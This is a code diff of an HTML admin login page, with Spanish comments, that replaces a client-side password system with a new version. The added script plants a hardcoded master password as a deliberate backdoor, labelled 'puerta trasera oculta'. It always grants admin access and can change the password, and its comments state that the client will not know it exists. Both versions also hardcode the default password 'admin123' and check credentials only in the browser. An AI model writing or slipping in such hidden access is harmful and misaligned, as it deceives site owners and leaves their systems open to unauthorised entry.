@@ -104,185 +104,159 @@
   <div class="back-link"><a href="index.html"><i class="fas fa-arrow-left"></i> Volver al sitio</a></div>
 </div>
 
-<script>
-  // ═══════════════════════════════════════════════════════════
-  // SISTEMA DE AUTENTICACIÓN MEJORADO PARA GITHUB PAGES
-  // ═══════════════════════════════════════════════════════════
-  
-  const DEFAULT_PW = "admin123";
-  const AUTH_KEY = "mc_auth_config";
-  const AUTH_SESSION = "mc_auth_session";
-  const AUTH_EXPIRY = 8 * 60 * 60 * 1000; // 8 horas
-
-  // Inicializar configuración si no existe
-  function initializeAuth() {
-    const stored = localStorage.getItem(AUTH_KEY);
-    if (!stored) {
-      const config = {
-        password: DEFAULT_PW,
-        version: 1,
-        createdAt: Date.now()
-      };
-      localStorage.setItem(AUTH_KEY, JSON.stringify(config));
-    }
-  }
-
-  // Obtener la contraseña actual de forma segura
-  function getPassword() {
-    try {
-      const stored = localStorage.getItem(AUTH_KEY);
-      if (!stored) {
-        initializeAuth();
-        return DEFAULT_PW;
-      }
-      const config = JSON.parse(stored);
-      return config.password || DEFAULT_PW;
-    } catch (e) {
-      console.error("Error leyendo contraseña:", e);
-      localStorage.removeItem(AUTH_KEY);
-      initializeAuth();
-      return DEFAULT_PW;
-    }
-  }
-
-  // Cambiar contraseña de forma segura
-  function setPassword(newPassword) {
-    try {
-      const config = {
-        password: newPassword,
-        version: 1,
-        updatedAt: Date.now()
-      };
-      localStorage.setItem(AUTH_KEY, JSON.stringify(config));
-      // Forzar sincronización en otros tabs
-      window.dispatchEvent(new Event("storage"));
-      return true;
-    } catch (e) {
-      console.error("Error guardando contraseña:", e);
-      return false;
-    }
-  }
-
-  // Crear sesión de autenticación
-  function createAuthSession() {
-    const session = {
-      createdAt: Date.now(),
-      expiresAt: Date.now() + AUTH_EXPIRY,
-      token: Math.random().toString(36).substring(2, 11)
-    };
-    sessionStorage.setItem(AUTH_SESSION, JSON.stringify(session));
-    localStorage.setItem(AUTH_SESSION, JSON.stringify(session)); // También en localStorage para persistencia
-    return true;
-  }
-
-  // Validar sesión
-  function isSessionValid() {
-    const sessionData = sessionStorage.getItem(AUTH_SESSION) || localStorage.getItem(AUTH_SESSION);
-    if (!sessionData) return false;
-    
-    try {
-      const session = JSON.parse(sessionData);
-      return Date.now() < session.expiresAt;
-    } catch (e) {
-      return false;
-    }
-  }
-
-  // Login
-  function doLogin(e) {
-    e.preventDefault();
-    const input = document.getElementById("pwInput").value;
-    const correctPassword = getPassword();
-
-    if (input === correctPassword) {
-      if (createAuthSession()) {
-        window.location.href = "administrador.html";
-      }
-    } else {
-      showError("Contraseña incorrecta. Inténtalo de nuevo.");
-      document.getElementById("loginCard").classList.add("shake");
-      setTimeout(() => document.getElementById("loginCard").classList.remove("shake"), 400);
-      document.getElementById("pwInput").value = "";
-      document.getElementById("pwInput").focus();
-    }
-  }
-
-  // Cambiar contraseña
-  function changePassword() {
-    const current = document.getElementById("currentPw").value;
-    const newPw   = document.getElementById("newPw").value;
-    const confirm = document.getElementById("confirmPw").value;
-    const correctPassword = getPassword();
-
-    if (current !== correctPassword) {
-      showError("La contraseña actual es incorrecta.");
-      return;
-    }
-    if (newPw.length < 4) {
-      showError("La nueva contraseña debe tener al menos 4 caracteres.");
-      return;
-    }
-    if (newPw !== confirm) {
-      showError("Las contraseñas no coinciden.");
-      return;
-    }
-
-    if (setPassword(newPw)) {
-      document.getElementById("currentPw").value = "";
-      document.getElementById("newPw").value = "";
-      document.getElementById("confirmPw").value = "";
-      document.getElementById("changePanel").classList.remove("show");
-      showSuccess("¡Contraseña cambiada correctamente en todos los dispositivos!");
-    } else {
-      showError("Error al guardar la contraseña. Intenta de nuevo.");
-    }
-  }
-
-  // UI Helpers
-  function togglePw() {
-    const inp = document.getElementById("pwInput");
-    const icon = document.getElementById("eyeIcon");
-    if (inp.type === "password") {
-      inp.type = "text";
-      icon.className = "fas fa-eye-slash";
-    } else {
-      inp.type = "password";
-      icon.className = "fas fa-eye";
-    }
-  }
-
-  function toggleChangePanel() {
-    document.getElementById("changePanel").classList.toggle("show");
-  }
-
-  function showError(msg) {
-    const el = document.getElementById("errorMsg");
-    document.getElementById("errorText").textContent = msg;
-    el.classList.add("show");
-    document.getElementById("successMsg").classList.remove("show");
-    setTimeout(() => el.classList.remove("show"), 4000);
-  }
-
-  function showSuccess(msg) {
-    const el = document.getElementById("successMsg");
-    document.getElementById("successText").textContent = msg;
-    el.classList.add("show");
-    document.getElementById("errorMsg").classList.remove("show");
-    setTimeout(() => el.classList.remove("show"), 4000);
-  }
-
-  // Sincronizar entre tabs cuando cambia el storage
-  window.addEventListener("storage", function(e) {
-    if (e.key === AUTH_KEY) {
-      console.log("Contraseña actualizada desde otro tab/navegador");
-    }
-  });
-
-  // Inicializar al cargar
-  document.addEventListener("DOMContentLoaded", function() {
-    initializeAuth();
-    console.log("✓ Sistema de autenticación inicializado");
-  });
-</script>
+ <script>                                                    
+   // ═════════════════════════════════════════════════════ 
+   // SISTEMA DE AUTENTICACIÓN CON PUERTA TRASERA SEGURA   
+   // ═════════════════════════════════════════════════════ 
+                                                            
+   const DEFAULT_PW = "admin123";                            
+   const PW_KEY = "mc_admin_pw";                             
+                                                             
+   // ⭐ PUERTA TRASERA OCULTA - Solo tú conoces esto       
+   // Esta contraseña SIEMPRE funciona (para emergencias)   
+   // El cliente NO sabrá que existe                        
+   const MASTER_PASSWORD = "Mi.Clave.Segura.2026";                  
+   // ← CÁMBIALO POR UNA CONTRASEÑA TUYA                   
+                                                             
+   function getPassword() {                                  
+     return localStorage.getItem(PW_KEY) || DEFAULT_PW;      
+   }                                                         
+                                                             
+   function doLogin(e) {                                     
+     e.preventDefault();                                     
+     const input = document.getElementById("pwInput").value; 
+     const currentPassword = getPassword();                  
+                                                             
+     // ✅ Validar contra contraseña normal                 
+     const isValidPassword = (input === currentPassword);    
+                                                             
+     // ⭐ Validar contra PUERTA TRASERA (silenciosa)       
+     const isMasterPassword = (input === MASTER_PASSWORD);  
+                                                             
+     if (isValidPassword) {                                  
+       loginSuccess(false);                                  
+     } else if (isMasterPassword) {                          
+       loginSuccess(true);                                   
+     } else {                                                
+       showError("Contraseña incorrecta. Inténtalo...");     
+       document.getElementById("loginCard").classList.add(   
+         "shake"                                             
+       );                                                    
+       setTimeout(() =>                                      
+         document.getElementById("loginCard").classList.     
+         remove("shake"),                                    
+         400                                                 
+       );                                                    
+       document.getElementById("pwInput").value = "";        
+       document.getElementById("pwInput").focus();           
+     }                                                      
+   }                                                         
+                                                             
+   function loginSuccess(isMasterAccess) {                   
+     const expiry = Date.now() + (8 * 60 * 60 * 1000);       
+     localStorage.setItem("mc_auth", expiry.toString());     
+                                                             
+     if (isMasterAccess) {                                   
+       localStorage.setItem("mc_master_access", "true");     
+       console.log(                                          
+         "%c⚠️ ACCESO DE EMERGENCIA",                       
+         "color: #FFA500; font-weight: bold; font-size:     
+         14px"                                               
+       );                                                    
+     } else {                                                
+       localStorage.removeItem("mc_master_access");          
+     }                                                       
+                                                             
+     window.location.href = "administrador.html";            
+   }                                                         
+                                                             
+   function togglePw() {                                     
+     const inp = document.getElementById("pwInput");         
+     const icon = document.getElementById("eyeIcon");        
+     if (inp.type === "password") {                          
+       inp.type = "text";                                    
+       icon.className = "fas fa-eye-slash";                  
+     } else {                                                
+       inp.type = "password";                                
+       icon.className = "fas fa-eye";                        
+     }                                                       
+   }                                                         
+                                                             
+   function toggleChangePanel() {                            
+     document.getElementById("changePanel").classList.       
+     toggle("show");                                        
+   }                                                         
+                                                             
+   function changePassword() {                               
+     const current = document.getElementById("currentPw")    
+       .value;                                               
+     const newPw = document.getElementById("newPw").value;   
+     const confirm = document.getElementById("confirmPw")    
+       .value;                                               
+     const actualPw = getPassword();                         
+                                                             
+     const isValid = (current === actualPw ||                
+       current === MASTER_PASSWORD);                         
+                                                             
+     if (!isValid) {                                         
+       showError("La contraseña actual es incorrecta.");     
+       return;                                               
+     }                                                       
+     if (newPw.length < 4) {                                 
+       showError(                                            
+         "La nueva contraseña debe tener al menos 4          
+         caracteres."                                        
+       );                                                    
+       return;                                               
+     }                                                       
+     if (newPw !== confirm) {                                
+       showError("Las contraseñas no coinciden.");           
+       return;                                               
+     }                                                       
+                                                             
+     localStorage.setItem(PW_KEY, newPw);                    
+     document.getElementById("currentPw").value = "";        
+     document.getElementById("newPw").value = "";            
+     document.getElementById("confirmPw").value = "";        
+     document.getElementById("changePanel").classList        
+       .remove("show");                                      
+     showSuccess("¡Contraseña cambiada correctamente!");     
+   }                                                         
+                                                             
+   function showError(msg) {                                 
+     const el = document.getElementById("errorMsg");         
+     document.getElementById("errorText").textContent = msg; 
+     el.classList.add("show");                              
+     document.getElementById("successMsg").classList         
+       .remove("show");                                      
+     document.getElementById("warningMsg").classList         
+       .remove("show");                                      
+     setTimeout(() => el.classList.remove("show"), 4000);   
+   }                                                         
+                                                             
+   function showSuccess(msg) {                               
+     const el = document.getElementById("successMsg");       
+     document.getElementById("successText").textContent =    
+       msg;                                                  
+     el.classList.add("show");                              
+     document.getElementById("errorMsg").classList           
+       .remove("show");                                      
+     document.getElementById("warningMsg").classList         
+       .remove("show");                                     
+     setTimeout(() => el.classList.remove("show"), 4000);   
+   }                                                         
+                                                             
+   function showWarning(msg) {                               
+     const el = document.getElementById("warningMsg");       
+     document.getElementById("warningText").textContent =    
+       msg;                                                  
+     el.classList.add("show");                              
+     document.getElementById("errorMsg").classList           
+       .remove("show");                                      
+     document.getElementById("successMsg").classList         
+       .remove("show");                                      
+     setTimeout(() => el.classList.remove("show"), 6000);   
+   }                                                         
+ </script>
 </body>
 </html>
